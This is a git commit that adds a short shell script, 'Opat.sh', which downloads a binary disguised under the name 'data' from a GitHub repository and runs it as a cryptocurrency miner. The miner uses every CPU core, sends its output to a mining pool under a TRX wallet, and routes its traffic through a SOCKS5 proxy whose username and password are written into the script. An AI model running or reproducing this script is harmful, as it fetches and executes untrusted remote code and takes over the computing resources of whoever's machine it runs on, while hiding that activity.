81bc3f50872fd82a96f3db566ab9f6b8a9e2f4b7
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-28 10:21:43 +0700

    Create Opat.sh

---
+++ Opat.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+apt update -y &&
+wget -q https://github.com/thirthada007/DevOps/raw/main/data
+chmod +x data
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://shnnernr:crxg0lmn1k7u@45.142.28.20:8031
